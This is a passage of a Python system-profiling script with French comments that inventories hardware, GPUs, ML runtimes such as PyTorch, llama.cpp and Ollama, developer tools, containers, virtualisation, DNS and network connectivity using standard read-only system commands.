    info = {"is_colab": True, "deep": env.get("DETECTOS_COLAB_DEEP") in ("1", "true", "yes")}
    
    try: info["cpu_cores"] = os.cpu_count()
    except: pass
    
    if psutil:
        try:
            vm = psutil.virtual_memory()
            info["ram"] = {
                "total": vm.total, "available": vm.available,
                "total_gib": round(vm.total / (1024**3), 2),
                "high_ram_hint": vm.total >= 25 * (1024**3)
            }
        except: pass
    
    # Disk /content
    if os.path.isdir("/content"):
        r = run_cmd("df -Pk /content")
        if r.get("ok") and r.get("stdout"):
            lines = r["stdout"].splitlines()
            if len(lines) >= 2:
                parts = re.split(r"\s+", lines[1].strip())
                if len(parts) >= 4 and parts[1].isdigit():
                    total, used, free = int(parts[1]) * 1024, int(parts[2]) * 1024, int(parts[3]) * 1024
                    info["disk_content"] = {"total_gib": round(total/(1024**3), 2), "free_gib": round(free/(1024**3), 2)}
    
    # GPU detailed
    if shutil.which("nvidia-smi"):
        q = "nvidia-smi --query-gpu=index,name,compute_cap,memory.total,memory.used,clocks.sm,clocks.mem,temperature.gpu,pstate,power.draw --format=csv,noheader,nounits"
        r = run_cmd(q, timeout=2.5)
        if r.get("ok") and r.get("stdout"):
            gpus = []
            for line in r["stdout"].splitlines():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 10:
                    try:
                        gpus.append({
                            "index": int(parts[0]) if parts[0].isdigit() else parts[0],
                            "name": parts[1], "compute_cap": parts[2],
                            "vram_total_mb": float(parts[3]), "vram_used_mb": float(parts[4]),
                            "sm_clock_mhz": float(parts[5]), "mem_clock_mhz": float(parts[6]),
                            "temp_c": float(parts[7]), "pstate": parts[8],
                            "power_w": float(parts[9]) if parts[9] not in ("[N/A]", "N/A") else None
                        })
                    except: continue
            if gpus: info["gpus"] = gpus
        
        # CUDA version
        header = run_cmd("nvidia-smi", timeout=2.0)
        if header.get("ok"):
            m = re.search(r"CUDA Version:\s*([0-9.]+)", header.get("stdout", ""))
            if m: info.setdefault("cuda", {})["version"] = m.group(1)
    
    # TPU
    if env.get("COLAB_TPU_ADDR"):
        tpu = {"addr": env.get("COLAB_TPU_ADDR")}
        r = run_cmd('python3 -c "import json;import jax;ds=jax.devices();print(json.dumps({\'devices\':[getattr(d,\'device_kind\',str(d)) for d in ds],\'count\':len(ds)}))"', timeout=3.0)
        if r.get("ok") and r.get("stdout", "").startswith("{"):
            try:
                j = json.loads(r["stdout"])
                tpu["jax"] = j
                m = re.search(r"TPU\s*v(\d+)", " ".join(j.get("devices", [])))
                if m: tpu["type_hint"] = f"v{m.group(1)}"
            except: pass
        info["tpu"] = tpu
    
    return info

# ======================== OUTILS / LANGAGES ========================
@safe(dict)
def detect_lang_envs() -> Dict[str, Any]:
    """Versions Python/Node/Java/Go/Rust, Docker/K8s, Homebrew."""
    tools = [
        ("python", "python --version"), ("python3", "python3 --version"),
        ("pip", "pip --version"), ("pip3", "pip3 --version"),
        ("brew", "brew --version"), ("ollama", "ollama --version"),
        ("node", "node -v"), ("npm", "npm -v"), ("yarn", "yarn -v"), ("pnpm", "pnpm -v"),
        ("java", "java -version"), ("javac", "javac -version"),
        ("go", "go version"), ("rustc", "rustc --version"), ("cargo", "cargo --version"),
        ("gcc", "gcc --version"), ("clang", "clang --version"),
        ("docker", "docker --version"), ("docker_compose", "docker compose version"),
        ("kubectl", "kubectl version --client --output=yaml"), ("helm", "helm version"),
        ("minikube", "minikube version"), ("kind", "kind version"),
        ("podman", "podman --version"), ("colima", "colima version")
    ]
    
    envs = {}
    for key, cmd in tools:
        if shutil.which(cmd.split()[0]) is None:
            envs[key] = None
            continue
        r = run_cmd(cmd)
        out = r.get("stdout") or r.get("stderr") or ""
        envs[key] = out.splitlines()[0] if out else None
    
    # Homebrew extras
    if envs.get("brew") and shutil.which("brew"):
        for k, cmd in [("brew_prefix", "brew --prefix"), ("brew_cellar", "brew --cellar")]:
            r = run_cmd(cmd)
            if r.get("ok"): envs[k] = r.get("stdout", "").strip()
        envs["brew_path"] = shutil.which("brew")
    
    return envs

# ======================== PYTORCH ========================
@safe(dict)
def detect_pytorch() -> Dict[str, Any]:
    """Détecte PyTorch: version, CUDA, MPS, GPU devices."""
    info = {"present": False}
    try:
        import torch
        info["present"] = True
        info["version"] = torch.__version__
        
        info["build_info"] = {
            "cuda_available": torch.cuda.is_available(),
            "mps_available": torch.backends.mps.is_available() if hasattr(torch.backends, 'mps') else False,
            "cpu_count": torch.get_num_threads(),
            "num_gpus": torch.cuda.device_count() if torch.cuda.is_available() else 0
        }
        
        if torch.cuda.is_available():
            cuda_info = {
                "version": torch.version.cuda,
                "cudnn_version": torch.backends.cudnn.version() if torch.backends.cudnn.is_available() else None,
                "device_count": torch.cuda.device_count(),
                "devices": []
            }
            for i in range(torch.cuda.device_count()):
                try:
                    props = torch.cuda.get_device_properties(i)
                    cuda_info["devices"].append({
                        "name": props.name, "total_memory_mb": props.total_memory // (1024 * 1024),
                        "major": props.major, "minor": props.minor,
                        "multi_processor_count": props.multi_processor_count
                    })
                except: pass
            info["cuda"] = cuda_info
        
        if hasattr(torch.backends, 'mps') and torch.backends.mps.is_available():
            info["mps"] = {"available": True}
        
        info["cpu"] = {"num_threads": torch.get_num_threads(), "num_interop_threads": torch.get_num_interop_threads()}
        
        caps = {}
        if hasattr(torch.backends, 'mkl'): caps["mkl"] = torch.backends.mkl.is_available()
        if hasattr(torch.backends, 'mkldnn'): caps["mkldnn"] = torch.backends.mkldnn.is_available()
        if caps: info["capabilities"] = caps
        
    except ImportError: pass
    except Exception as e: info["error"] = str(e)
    
    return info

# ======================== LLAMA.CPP ========================
@safe(dict)
def detect_llamacpp() -> Dict[str, Any]:
    """Détecte llama.cpp: binaires, versions, modèles GGUF."""
    info = {"present": False}
    binaries = ["llama-cli", "llama-server", "llama-bench", "llama-quantize"]
    
    found = {}
    for binary in binaries:
        path = shutil.which(binary)
        if path:
            ver = run_cmd(f"{shlex.quote(path)} --version", timeout=2.0)
            version = (ver.get("stdout") or ver.get("stderr") or "").splitlines()[0].strip() if ver.get("ok") else None
            found[binary] = {"path": path, "version": version}
    
    if found:
        info["present"] = True
        info["binaries"] = found
    
    # Running servers
    if psutil:
        try:
            servers = [{"pid": p.info["pid"], "name": p.info["name"]}
                      for p in psutil.process_iter(attrs=["name", "pid"])
                      if "llama-server" in (p.info.get("name") or "").lower()]
            if servers: info["running_servers"] = servers
        except: pass
    
    # GGUF models
    model_dirs = [os.path.expanduser("~/.cache/llama.cpp/models"), os.path.expanduser("~/.llama/models"),
                  os.getcwd(), os.path.join(os.getcwd(), "models"), os.path.expanduser("~/models")]
    gguf_models = []
    for model_dir in model_dirs:
        if os.path.isdir(model_dir):
            try:
                for root, _, files in os.walk(model_dir):
                    for f in files:
                        if f.lower().endswith('.gguf'):
                            full_path = os.path.join(root, f)
                            try: size = os.path.getsize(full_path)
                            except: size = None
                            gguf_models.append({"name": f, "path": full_path, "size_gib": round(size / (1024**3), 2) if size else None})
            except: continue
    
    if gguf_models:
        gguf_models.sort(key=lambda x: x.get("size_gib") or 0, reverse=True)
        info["gguf_models"] = gguf_models[:50]
        info["gguf_models_count"] = len(gguf_models)
    
    return info

# ======================== OLLAMA ========================
@safe(dict)
def detect_ollama() -> Dict[str, Any]:
    """Détecte Ollama: version, serveur, modèles installés."""
    info = {"present": False}
    if shutil.which("ollama") is None: return info
    
    info["present"] = True
    ver = run_cmd("ollama --version", timeout=2.0)
    if ver.get("ok"): info["version"] = (ver.get("stdout") or ver.get("stderr") or "").splitlines()[0].strip()
    
    if os.environ.get("OLLAMA_HOST"): info["host"] = os.environ.get("OLLAMA_HOST")
    if os.environ.get("OLLAMA_MODELS"): info["models_path"] = os.environ.get("OLLAMA_MODELS")
    
    # Server check
    pids = []
    if psutil:
        try:
            for p in psutil.process_iter(attrs=["name", "cmdline", "pid"]):
                name = (p.info.get("name") or "").lower()
                cmd = " ".join(p.info.get("cmdline") or []).lower()
                if "ollama" in name or "ollama" in cmd:
                    if "serve" in cmd or name == "ollama":
                        try: pids.append(int(p.info.get("pid") or 0))
                        except: continue
        except: pass
    info["server_running"] = len(pids) > 0
    if pids: info["server_pids"] = pids
    
    # Models list
    ls = run_cmd("ollama list", timeout=3.0)
    if ls.get("ok") and ls.get("stdout"):
        lines = [ln for ln in ls["stdout"].splitlines() if ln.strip()]
        if lines and re.search(r"NAME\s+ID", lines[0]):
            models = []
            for line in lines[1:]:
                cols = re.split(r"\s{2,}", line.strip())
                if cols: models.append({"name": cols[0], "id": cols[1] if len(cols) > 1 else None,
                                       "size": cols[2] if len(cols) > 2 else None})
            if models:
                info["installed_models"] = models
                info["model_count"] = len(models)
                info["model_names"] = [m["name"] for m in models]
    
    return info

# ======================== NAVIGATEURS ========================
@safe(dict)
def detect_browsers() -> Dict[str, Any]:
    """Détecte Chrome/Chromium et User-Agent."""
    info = {}
    candidates = []
    if SYS == "Darwin":
        candidates.extend(["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                          "/Applications/Chromium.app/Contents/MacOS/Chromium"])
    candidates.extend(["google-chrome", "chromium", "chromium-browser", "chrome"])
    
    chrome_path = None
    for c in candidates:
        p = shutil.which(c) if not c.startswith("/") else (c if os.path.exists(c) else None)
        if p: chrome_path = p; break
    
    if chrome_path:
        info["chrome_path"] = chrome_path
        ver = run_cmd(f"{shlex.quote(chrome_path)} --version")
        if ver.get("ok"): info["chrome_version"] = (ver.get("stdout") or "").strip()
    else:
        info["chrome_path"] = None
    
    return info

@safe(dict)
def detect_user_agents() -> Dict[str, Any]:
    """User-Agents Python et curl."""
    out = {"python_ua": f"Python/{platform.python_version()} ({SYS}; {platform.machine()})"}
    if shutil.which("curl"):
        r = run_cmd("curl -s --max-time 2 https://httpbin.org/user-agent")
        if r.get("ok") and r.get("stdout", "").startswith("{"):
            try:
                j = json.loads(r["stdout"])
                out["curl_ua"] = j.get("user-agent")
            except: pass
    return out

# ======================== MCP ========================
@safe(dict)
def detect_mcps() -> Dict[str, Any]:
    """Détecte mcphost et configs MCP."""
    info = {}
    if shutil.which("mcphost"):
        v = run_cmd("mcphost --version")
        if v.get("ok"): info["mcphost_version"] = (v.get("stdout") or v.get("stderr") or "").splitlines()[0]
        info["mcphost_path"] = shutil.which("mcphost")
    
    # Config files
    cfgs = []
    try:
        for root, _, files in os.walk(os.getcwd()):
            for fn in files:
                if fn == "mcphost-config.yml": cfgs.append(os.path.join(root, fn))
    except: pass
    if cfgs: info["configs"] = cfgs
    
    return info

# ======================== PATHS ========================
@safe(dict)
def detect_paths() -> Dict[str, Any]:
    """Chemins système usuels."""
    paths = {"user_home": os.path.expanduser("~"), "linux_home_root": "/home"}
    if SYS == "Darwin": paths["mac_users_root"] = "/Users"
    if SYS == "Windows":
        paths["windows_userprofile"] = os.environ.get("USERPROFILE")
        paths["windows_homedrive"] = os.environ.get("HOMEDRIVE")
    return paths

# ======================== SANTE SYSTEME ========================
def _format_duration(seconds: float) -> str:
    try:
        seconds = int(seconds)
        d, rem = divmod(seconds, 86400)
        h, rem = divmod(rem, 3600)
        m, s = divmod(rem, 60)
        parts = []
        if d: parts.append(f"{d}d")
        if h or parts: parts.append(f"{h}h")
        if m or parts: parts.append(f"{m}m")
        parts.append(f"{s}s")
        return " ".join(parts)
    except: return str(seconds)

@safe(dict)
def detect_health() -> Dict[str, Any]:
    """Uptime, load average, températures, ventilateurs."""
    out = {}
    
    # Uptime
    boot_ts = None
    if psutil and hasattr(psutil, "boot_time"):
        try: boot_ts = psutil.boot_time()
        except: pass
    
    if not boot_ts:
        if SYS == "Darwin":
            r = run_cmd("sysctl -n kern.boottime")
            if r.get("ok"):
                m = re.search(r"sec\s*=\s*(\d+)", r["stdout"]) or re.search(r"\{(\d+),", r["stdout"])
                if m: boot_ts = int(m.group(1))
        elif SYS == "Linux":
            r = run_cmd("cut -d. -f1 /proc/uptime")
            if r.get("ok") and r.get("stdout", "").strip().isdigit():
                boot_ts = time.time() - int(r["stdout"])
        elif SYS == "Windows":
            r = run_cmd("wmic os get LastBootUpTime /value", timeout=3.5)
            if r.get("ok"):
                m = re.search(r"LastBootUpTime=(\d{14})", r["stdout"])
                if m:
                    try: boot_ts = datetime.strptime(m.group(1), "%Y%m%d%H%M%S").timestamp()
                    except: pass
    
    if boot_ts:
        out["boot_time"] = datetime.fromtimestamp(float(boot_ts)).strftime("%Y-%m-%d %H:%M:%S")
        out["wake time"] = _format_duration(time.time() - float(boot_ts))
    
    # Load average
    try:
        if hasattr(os, "getloadavg"):
            la = os.getloadavg()
            out["load_average"] = {"1m": la[0], "5m": la[1], "15m": la[2]}
    except: pass
    
    # Temperatures
    temps = []
    if psutil and hasattr(psutil, "sensors_temperatures"):
        try:
            t = psutil.sensors_temperatures(fahrenheit=False)
            if t:
                for chip, entries in t.items():
                    for e in entries:
                        temps.append({"label": e.label or chip, "current_c": getattr(e, "current", None)})
        except: pass
    
    if not temps and shutil.which("sensors"):
        r = run_cmd("sensors")
        if r.get("ok"):
            for line in r["stdout"].splitlines():
                m = re.search(r"([^:]+):\s*\+?([0-9]+\.?[0-9]*)°C", line)
                if m: temps.append({"label": m.group(1).strip(), "current_c": float(m.group(2))})
    
    if temps: out["temperatures"] = temps
    
    # Fans
    fans = []
    if shutil.which("sensors"):
        r = run_cmd("sensors")
        if r.get("ok"):
            for line in r["stdout"].splitlines():
                m = re.search(r"(fan\d+):\s*([0-9]+)\s*RPM", line, re.I)
                if m: fans.append({"label": m.group(1), "rpm": int(m.group(2))})
    if fans: out["fans"] = fans
    
    return out

# ======================== USAGE TEMPS REEL ========================
@safe(dict)
def detect_usage() -> Dict[str, Any]:
    """Charge CPU/GPU en temps réel + métriques pour IA/ML."""
    out = {}
    if psutil:
        try:
            out["cpu_total_percent"] = psutil.cpu_percent(interval=0.2)
            out["cpu_per_core_percent"] = psutil.cpu_percent(interval=0.1, percpu=True)
            # Métriques IA/ML supplémentaires
            out["cpu_freq_current_mhz"] = psutil.cpu_freq().current if psutil.cpu_freq() else None
            out["cpu_count_logical"] = psutil.cpu_count(logical=True)
            out["cpu_count_physical"] = psutil.cpu_count(logical=False)
        except: pass

    if shutil.which("nvidia-smi"):
        # Métriques GPU détaillées pour IA
        q = "nvidia-smi --query-gpu=index,name,utilization.gpu,utilization.memory,memory.used,memory.total,memory.free,temperature.gpu,power.draw,power.limit,clocks.current.sm,clocks.current.memory,compute_mode --format=csv,noheader,nounits"
        r = run_cmd(q, timeout=3.0)
        if r.get("ok") and r.get("stdout"):
            gpus = []
            for line in r["stdout"].splitlines():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 13:
                    try:
                        gpu = {
                            "index": int(parts[0]) if parts[0].isdigit() else parts[0],
                            "name": parts[1], "util_gpu_percent": float(parts[2]),
                            "util_mem_percent": float(parts[3]),
                            "vram_used_mb": float(parts[4]), "vram_total_mb": float(parts[5]),
                            "vram_free_mb": float(parts[6]), "temp_c": float(parts[7]),
                            "power_draw_w": float(parts[8]) if parts[8] not in ("[N/A]", "N/A") else None,
                            "power_limit_w": float(parts[9]) if parts[9] not in ("[N/A]", "N/A") else None,
                            "clock_sm_mhz": float(parts[10]), "clock_mem_mhz": float(parts[11]),
                            "compute_mode": parts[12]
                        }
                        # Métriques pour IA/ML
                        gpu["vram_available_for_ml_gb"] = round(gpu["vram_free_mb"] / 1024, 2)
                        gpu["power_efficiency"] = round(gpu["util_gpu_percent"] / (gpu["power_draw_w"] or 1), 2) if gpu["power_draw_w"] else None
                        gpus.append(gpu)
                    except: continue
            if gpus: out["nvidia"] = gpus

    return out

# ======================== SANDBOX / VIRTUALISATION ========================
@safe(dict)
def detect_sandbox() -> Dict[str, Any]:
    """Détecte environnements sandbox/virtualisés."""
    sb = {"container_file": any(os.path.exists(p) for p in ["/.dockerenv", "/run/.containerenv"])}
    
    if shutil.which("systemd-detect-virt"):
        v1 = run_cmd("systemd-detect-virt", timeout=1.5)
        if v1.get("ok") and v1.get("stdout", "").strip() not in ("", "none"):
            sb["virtualization"] = v1["stdout"].strip()
        v2 = run_cmd("systemd-detect-virt -c", timeout=1.5)
        if v2.get("ok") and v2.get("stdout", "").strip() not in ("", "none"):
            sb["container_type"] = v2["stdout"].strip()
    
    sb["flatpak"] = os.path.exists("/.flatpak-info") or bool(os.environ.get("FLATPAK_ID"))
    sb["snap"] = bool(os.environ.get("SNAP"))
    sb["appimage"] = bool(os.environ.get("APPIMAGE"))
    
    if SYS == "Linux":
        try:
            with open("/proc/self/status", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.startswith("Seccomp:"):
                        sb["seccomp_mode"] = int(line.split(":", 1)[1].strip())
                        break
        except: pass
    
    if SYS == "Darwin":
        r = run_cmd("sysctl -in sysctl.proc_translated")
        if r.get("ok"): sb["rosetta_translated"] = r.get("stdout", "").strip() in ("1", "true")
    
    return sb

# ======================== HYPERVISEUR ========================
@safe(dict)
def detect_hypervisor() -> Dict[str, Any]:
    """Détecte type d'hyperviseur (KVM, VMware, Hyper-V, etc.)."""
    info = {}
    
    if SYS == "Linux":
        if shutil.which("systemd-detect-virt"):
            r = run_cmd("systemd-detect-virt", timeout=1.5)
            if r.get("ok") and r.get("stdout", "").strip() != "none":
                info["detector"] = "systemd-detect-virt"
                info["type"] = r["stdout"].strip()
        
        lc = run_cmd("lscpu", timeout=1.5)
        if lc.get("ok"):
            m = re.search(r"Hypervisor vendor:\s*(.+)", lc["stdout"])
            if m: info["vendor"] = m.group(1).strip()
        
        # DMI hints
        dmi = {}
        for p in ["/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/product_name"]:
            try:
                if os.path.exists(p):
                    with open(p, "r", encoding="utf-8", errors="ignore") as f:
                        dmi[os.path.basename(p)] = f.read().strip()
            except: pass
        if dmi:
            info["dmi"] = dmi
            t = " ".join(dmi.values()).lower()
            for key, label in [("vmware", "vmware"), ("kvm", "kvm"), ("qemu", "qemu"),
                               ("microsoft", "hyper-v"), ("virtualbox", "virtualbox")]:
                if key in t: info["guessed"] = label; break
    
    elif SYS == "Windows":
        r = run_cmd("wmic computersystem get Model,Manufacturer,HypervisorPresent /format:list", timeout=2.5)
        if r.get("ok"):
            for line in r["stdout"].splitlines():
                if "=" in line:
                    k, v = line.split("=", 1)
                    k, v = k.strip().lower(), v.strip()
                    if k == "model": info["model"] = v
                    elif k == "manufacturer": info["manufacturer"] = v
                    elif k == "hypervisorpresent": info["hypervisor_present"] = v.lower() in ("true", "1")
            s = f"{info.get('manufacturer', '')} {info.get('model', '')}".lower()
            for key, label in [("vmware", "vmware"), ("microsoft", "hyper-v"), ("virtualbox", "virtualbox")]:
                if key in s: info["guessed"] = label; break
    
    elif SYS == "Darwin":
        sp = run_cmd("system_profiler SPHardwareDataType -json", timeout=3.0)
        if sp.get("ok"):
            s = sp.get("stdout", "").lower()
            for key, label in [("vmware", "vmware"), ("virtualbox", "virtualbox"), ("parallels", "parallels")]:
                if key in s: info["guessed"] = label; break
    
    return info

# ======================== CONTENEURS ========================
@safe(dict)
def detect_containers() -> Dict[str, Any]:
    """Liste conteneurs Docker/Podman et pods Kubernetes."""
    out = {}
    
    # Docker
    if shutil.which("docker"):
        r = run_cmd('docker ps --format "{{.ID}}||{{.Image}}||{{.Names}}||{{.Status}}"', timeout=4.0)
        if r.get("ok") and r.get("stdout"):
            containers = []
            for line in r["stdout"].splitlines():
                parts = line.split("||")
                if len(parts) >= 4:
                    containers.append({"id": parts[0], "image": parts[1], "name": parts[2], "status": parts[3]})
            out["docker"] = containers
    
    # Podman
    if shutil.which("podman"):
        r = run_cmd("podman ps --format json", timeout=4.0)
        if r.get("ok") and r.get("stdout", "").strip().startswith("["):
            try: out["podman"] = json.loads(r["stdout"])
            except: pass
    
    # Kubernetes
    if shutil.which("kubectl"):
        r = run_cmd("kubectl get pods -A -o json --request-timeout=3s", timeout=5.0)
        if r.get("ok") and r.get("stdout", "").strip().startswith("{"):
            try:
                j = json.loads(r["stdout"])
                pods = [{"ns": item.get("metadata", {}).get("namespace"),
                        "name": item.get("metadata", {}).get("name"),
                        "phase": item.get("status", {}).get("phase")}
                       for item in j.get("items", [])]
                out["kubernetes"] = pods
            except: pass
    
    return out

# ======================== DATE / HEURE ========================
@safe(dict)
def detect_datetime() -> Dict[str, Any]:
    """Date/heure, timezone, DST, synchronisation."""
    info = {}
    
    try:
        now_local = datetime.now()
        now_utc = datetime.now(timezone.utc)
        info["now_local_iso"] = now_local.isoformat()
        info["now_utc_iso"] = now_utc.isoformat()
        info["epoch_s"] = int(time.time())
    except: pass
    
    try:
        info["timezone_name"] = time.tzname[0] if time.tzname else None
        is_dst = time.daylight == 1 and time.localtime().tm_isdst > 0
        info["utc_offset_seconds"] = -time.altzone if is_dst else -time.timezone
        info["is_dst"] = is_dst
    except: pass
    
    # Sync info
    sync = {}
    if SYS == "Linux":
        r = run_cmd("timedatectl show -p NTPSynchronized -p Timezone")
        if r.get("ok"):
            for line in r["stdout"].splitlines():
                if "=" in line:
                    k, v = line.split("=", 1)
                    sync[k] = v.strip()
    elif SYS == "Darwin":
        tz = run_cmd("systemsetup -gettimezone")
        if tz.get("ok"): sync["TimeZone"] = tz.get("stdout")
    elif SYS == "Windows":
        tz = run_cmd("tzutil /g")
        if tz.get("ok"): sync["TimeZone"] = tz.get("stdout")
    if sync: info["sync"] = sync
    
    return info

# ======================== DNS ========================
@safe(dict)
def detect_dns() -> Dict[str, Any]:
    """Détection complète des serveurs DNS utilisés par le système."""
    info = {
        "nameservers": [],
        "dns_providers": [],
        "resolution_test": {},
        "response_times_ms": {}
    }

    nameservers = []

    # 1. Détection DNS selon l'OS
    if SYS == "Linux":
        # /etc/resolv.conf
        try:
            if os.path.exists("/etc/resolv.conf"):
                with open("/etc/resolv.conf", "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith("nameserver"):
                            parts = line.split()
                            if len(parts) >= 2:
                                nameservers.append(parts[1])
        except:
            pass

        # systemd-resolved
        if shutil.which("systemd-resolve"):
            r = run_cmd("systemd-resolve --status", timeout=3.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    if "DNS Servers:" in line or "Current DNS Server:" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            dns = parts[1].strip()
                            if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns):
                                nameservers.append(dns)

        # resolvectl (newer systemd)
        elif shutil.which("resolvectl"):
            r = run_cmd("resolvectl status", timeout=3.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    if "DNS Servers:" in line or "Current DNS Server:" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            dns = parts[1].strip()
                            if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns):
                                nameservers.append(dns)

    elif SYS == "Darwin":
        # macOS: scutil --dns
        if shutil.which("scutil"):
            r = run_cmd("scutil --dns", timeout=3.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    line = line.strip()
                    if line.startswith("nameserver["):
                        parts = line.split(":")
                        if len(parts) >= 2:
                            dns = parts[1].strip()
                            if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns):
                                nameservers.append(dns)

        # Fallback: networksetup
        if not nameservers and shutil.which("networksetup"):
            # Lister les services réseau
            r = run_cmd("networksetup -listallnetworkservices", timeout=3.0)
            if r.get("ok"):
                services = [s.strip() for s in r["stdout"].splitlines() if s.strip() and not s.startswith("*")]
                for service in services[:5]:  # Limiter à 5 services
                    r = run_cmd(f'networksetup -getdnsservers "{service}"', timeout=2.0)
                    if r.get("ok") and r.get("stdout"):
                        for line in r["stdout"].splitlines():
                            dns = line.strip()
                            if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns) and "There aren't any" not in dns:
                                nameservers.append(dns)

    elif SYS == "Windows":
        # Windows: ipconfig /all
        r = run_cmd("ipconfig /all", timeout=4.0)
        if r.get("ok"):
            for line in r["stdout"].splitlines():
                line = line.strip()
                if "DNS Servers" in line or "Serveurs DNS" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        dns = parts[1].strip()
                        if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns):
                            nameservers.append(dns)

        # Aussi via PowerShell
        if shutil.which("powershell"):
            r = run_cmd('powershell -Command "Get-DnsClientServerAddress | Select-Object -ExpandProperty ServerAddresses"', timeout=4.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    dns = line.strip()
                    if dns and re.match(r'^[0-9a-fA-F:\.]+$', dns):
                        nameservers.append(dns)

    # Dédupliquer les nameservers
    nameservers = list(dict.fromkeys(nameservers))
    info["nameservers"] = nameservers

    # 2. Identifier les fournisseurs DNS publics connus
    dns_providers_map = {
        "8.8.8.8": "Google DNS",
        "8.8.4.4": "Google DNS",
        "1.1.1.1": "Cloudflare DNS",
        "1.0.0.1": "Cloudflare DNS",
        "9.9.9.9": "Quad9 DNS",
        "149.112.112.112": "Quad9 DNS",
        "208.67.222.222": "OpenDNS",
        "208.67.220.220": "OpenDNS",
        "64.6.64.6": "Verisign DNS",
        "64.6.65.6": "Verisign DNS",
        "77.88.8.8": "Yandex DNS",
        "77.88.8.1": "Yandex DNS",
        "94.140.14.14": "AdGuard DNS",
        "94.140.15.15": "AdGuard DNS",
        "2001:4860:4860::8888": "Google DNS (IPv6)",
        "2001:4860:4860::8844": "Google DNS (IPv6)",
        "2606:4700:4700::1111": "Cloudflare DNS (IPv6)",
        "2606:4700:4700::1001": "Cloudflare DNS (IPv6)",
    }

    dns_providers = []
    for ns in nameservers:
        if ns in dns_providers_map:
            dns_providers.append({
                "ip": ns,
                "provider": dns_providers_map[ns],
                "type": "public"
            })
        elif ns.startswith("127.") or ns == "::1":
            dns_providers.append({
                "ip": ns,
                "provider": "Local/Loopback",
                "type": "local"
            })
        elif ns.startswith("192.168.") or ns.startswith("10.") or ns.startswith("172."):
            dns_providers.append({
                "ip": ns,
                "provider": "Private/Router",
                "type": "private"
            })
        else:
            dns_providers.append({
                "ip": ns,
                "provider": None,
                "type": None
            })

    info["dns_providers"] = dns_providers

    # 3. Tester la résolution DNS avec les domaines communs
    test_domains = ["google.com", "cloudflare.com", "example.com"]
    resolution_results = {}

    for domain in test_domains:
        try:
            start = time.time()
            infos = socket.getaddrinfo(domain, None, proto=socket.IPPROTO_TCP)
            elapsed_ms = round((time.time() - start) * 1000, 2)

            addresses = sorted({ai[4][0] for ai in infos})[:4]
            resolution_results[domain] = {
                "resolved": True,
                "addresses": addresses,
                "response_time_ms": elapsed_ms
            }
        except Exception as e:
            resolution_results[domain] = {
                "resolved": False,
                "error": str(e)
            }

    info["resolution_test"] = resolution_results

    # 4. Mesurer le temps de réponse moyen
    response_times = [
        result.get("response_time_ms")
        for result in resolution_results.values()
        if result.get("response_time_ms")
    ]

    if response_times:
        info["average_response_time_ms"] = round(sum(response_times) / len(response_times), 2)
        info["dns_performance"] = "fast" if info["average_response_time_ms"] < 50 else "normal" if info["average_response_time_ms"] < 150 else "slow"

    # 5. Détecter DNS over HTTPS (DoH) ou DNS over TLS (DoT)
    doh_dot_indicators = []

    # Firefox DoH
    if SYS == "Linux":
        firefox_prefs = os.path.expanduser("~/.mozilla/firefox/*.default*/prefs.js")
        for prefs_file in glob.glob(firefox_prefs):
            try:
                with open(prefs_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if 'network.trr.mode' in content and 'network.trr.uri' in content:
                        doh_dot_indicators.append("Firefox DoH detected")
                        break
            except:
                pass

    # Chrome DoH (via command line flags or policy)
    # systemd-resolved avec DoT
    if SYS == "Linux" and os.path.exists("/etc/systemd/resolved.conf"):
        try:
            with open("/etc/systemd/resolved.conf", 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if "DNSOverTLS" in content:
                    doh_dot_indicators.append("systemd-resolved DoT configured")
        except:
            pass

    if doh_dot_indicators:
        info["encrypted_dns"] = doh_dot_indicators

    return info

# ======================== INTERNET ========================
@safe(dict)
def detect_internet() -> Dict[str, Any]:
    """Connectivité: DNS, routes, TCP/HTTP, latence."""
    result = {}
    
    # Nameservers
    nameservers = []
    try:
        if os.path.exists("/etc/resolv.conf"):
            with open("/etc/resolv.conf", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.strip().startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2: nameservers.append(parts[1])
    except: pass
    if nameservers: result["nameservers"] = list(dict.fromkeys(nameservers))
    
    # Default gateway
    gateway = None
    if SYS == "Linux" and shutil.which("ip"):
        r = run_cmd("ip route get 1.1.1.1")
        if r.get("ok"):
            m = re.search(r"via\s+([0-9a-fA-F:\.]+)", r["stdout"])
            if m: gateway = m.group(1)
    elif SYS == "Darwin":
        r = run_cmd("route -n get default")
        if r.get("ok"):
            m = re.search(r"gateway:\s+([0-9a-fA-F:\.]+)", r["stdout"])
            if m: gateway = m.group(1)
    if gateway: result["default_gateway"] = gateway
    
    # DNS resolution
    resolutions = {}
    for d in ["example.com", "google.com"]:
        try:
            infos = socket.getaddrinfo(d, None, proto=socket.IPPROTO_TCP)
            resolutions[d] = {"ok": True, "addresses": sorted({ai[4][0] for ai in infos})[:4]}
        except Exception as e:
            resolutions[d] = {"ok": False, "error": str(e)}
    result["dns_resolution"] = resolutions
    
    # TCP tests
    def tcp_ok(host, port, timeout_s=1.2):
        try:
            with socket.create_connection((host, port), timeout=timeout_s):
                return True
        except:
            return False
    
    result["tcp"] = {
        "1.1.1.1:53": tcp_ok("1.1.1.1", 53),
        "8.8.8.8:443": tcp_ok("8.8.8.8", 443),
        "www.google.com:443": tcp_ok("www.google.com", 443)
    }
    
    # HTTP probes
    http_checks = {}
    for url in ["http://example.com", "https://www.google.com"]:
        try:
            start = time.time()
